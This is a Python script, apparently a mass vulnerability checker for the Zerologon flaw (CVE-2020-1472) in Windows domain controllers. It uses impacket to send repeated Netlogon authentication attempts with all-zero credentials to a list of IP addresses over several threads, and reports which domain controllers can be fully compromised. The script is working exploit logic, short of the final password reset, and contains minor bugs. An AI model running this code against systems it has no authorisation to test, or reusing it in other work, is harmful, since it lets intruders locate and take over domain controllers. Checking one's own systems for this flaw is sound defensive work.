#!/usr/bin/python3
# -*- coding: utf-8 -*-
 
from nmb.NetBIOS import NetBIOS
import argparse, threading, queue, os.path
from termcolor import cprint

from impacket.dcerpc.v5 import nrpc, epm
from impacket.dcerpc.v5.dtypes import NULL
from impacket.dcerpc.v5 import transport
from impacket import crypto

import hmac, hashlib, struct, sys, socket, time, pyfiglet
from binascii import hexlify, unhexlify
from subprocess import check_call

ochered = queue.Queue()
MAX_ATTEMPTS = 2000	

def getBIOSName2(remote_add):
    try:
        hostName = socket.gethostbyaddr(remote_add)
    except Exception as error:
        return "continue321"

    if hostName[0] == "":
        return "continue321"
    else:
        return hostName[0].split(".")[0]

def getBIOSName(remote_smb_ip, timeout=30):
    try:
        bios = NetBIOS()
        srv_name = bios.queryIPForName(remote_smb_ip, timeout=timeout)
    except:
        print >> sys.stderr, "Looking up timeout, check remote_smb_ip again!!"
    finally:
        bios.close()
        return srv_name

def start(*args):
    while True:
        if ochered.empty() == True:
            exit()
        else:
            dc_ip = ochered.get()

            if name == "empty":
                try:
                    dc_name = getBIOSName(dc_ip)[0]
                except Exception as error:
                    dc_name = getBIOSName2(dc_ip)
            else:
                dc_name = name

            if dc_name == "continue321":
                cprint("[-] Cant get NetBIOS computer name. IP = {}".format(dc_ip), "red")
                continue

            perform_attack('\\\\' + dc_name, dc_ip, dc_name)

def try_zero_authenticate(dc_handle, dc_ip, target_computer):
  # Connect to the DC's Netlogon service.
    try:
        binding = epm.hept_map(dc_ip, nrpc.MSRPC_UUID_NRPC, protocol='ncacn_ip_tcp')
        rpc_con = transport.DCERPCTransportFactory(binding).get_dce_rpc()
        rpc_con.connect()
        rpc_con.bind(nrpc.MSRPC_UUID_NRPC)
    except Exception as error:
        pass
        return "conn"

  # Use an all-zero challenge and credential.
    plaintext = b'\x00' * 8
    ciphertext = b'\x00' * 8

  # Standard flags observed from a Windows 10 client (including AES), with only the sign/seal flag disabled. 
    flags = 0x212fffff

  # Send challenge and authentication request.
    try:
        nrpc.hNetrServerReqChallenge(rpc_con, dc_handle + '\x00', target_computer + '\x00', plaintext)
    except Exception as error:
        return "bad"

    try:
        server_auth = nrpc.hNetrServerAuthenticate3(
            rpc_con, dc_handle + '\x00', target_computer + '$\x00', nrpc.NETLOGON_SECURE_CHANNEL_TYPE.ServerSecureChannel, 
            target_computer + '\x00', ciphertext, flags
        )

    # It worked!
        assert server_auth['ErrorCode'] == 0
        return rpc_con

    except nrpc.DCERPCSessionError as ex:
    # Failure should be due to a STATUS_ACCESS_DENIED error. Otherwise, the attack is probably not working.
        if ex.get_error_code() == 0xc0000022:
            return None
        else:
            return "break"
    except BaseException as ex:
        return "break"


def perform_attack(dc_handle, dc_ip, target_computer):
    rpc_con = None
    for attempt in range(0, MAX_ATTEMPTS):
        rpc_con = try_zero_authenticate(dc_handle, dc_ip, target_computer)
    

        if rpc_con == "conn":
            cprint("[-] Attack failed. Target is probably patched. IP = {} ComputerName = {}".format(dc_ip, target_computer), "red")
            return
        elif rpc_con == "bad":
            cprint("[-] Bad NetBIOS computer name. IP = {} ComputerName = {}".format(dc_ip, target_computer), "red")
            return
        elif rpc_con == "break":
            cprint("This might have been caused by invalid arguments or network issues. IP = {} ComputerName = {}".format(dc_ip, target_computer), "red")
            return
        elif rpc_con == None:
            continue
        else:
            break

    if rpc_con:
        cprint('[+] Success! DC can be fully compromised by a Zerologon attack. IP = {} ComputerName = {}'.format(dc_ip, target_computer), "green")
    else:
        cprint('[-] Attack failed. Target is probably patched. IP = {} ComputerName = {}'.format(dc_ip, target_computer), "red")
    
    return

if __name__ == '__main__':
    parser = argparse.ArgumentParser(add_help = True, formatter_class = argparse.RawDescriptionHelpFormatter, epilog = """Mass check on CVE-2020-1472
        python3 check_cve-2020-1472.py --ip <ip>
        python3 check_cve-2020-1472.py --ip <ip> --name <NetBIOS computer name>
        python3 check_cve-2020-1472.py --file <path>
        """)
    parser.add_argument('--ip', type = str, help = 'Ip address for check on CVE-2020-1472')
    parser.add_argument('--file', type = str, help = 'File path with IP addresses')
    parser.add_argument('--threads', type = int, help = 'Number of threads')
    parser.add_argument('--name', type = str, help = 'NetBIOS computer name, use with --ip flag')

    args = parser.parse_args()
    name = "empty"

    banner = pyfiglet.figlet_format("Zerologon", "doom")
    cprint(banner, "green")

    if args.ip == None and args.file == None:
        cprint("Use --help for more information", "red")
        exit()

    if args.file != None:
        
        if os.path.isfile(args.file) == False:
            print("File with IP addresses does not exist")
        else:
            file = open(args.file, 'r')
            for line in file:
                ochered.put(line.strip())

            if args.threads == None:
                number_of_threads = 5
            else:
                number_of_threads = args.threads

    elif args.file == None and args.ip != None:
        if args.name != None:
            name = args.name

        number_of_threads = 1
        ochered.put(args.ip.strip())        
        
    for line in range(number_of_threads):
        th = threading.Thread(target = start, args = (name))
        th.start()
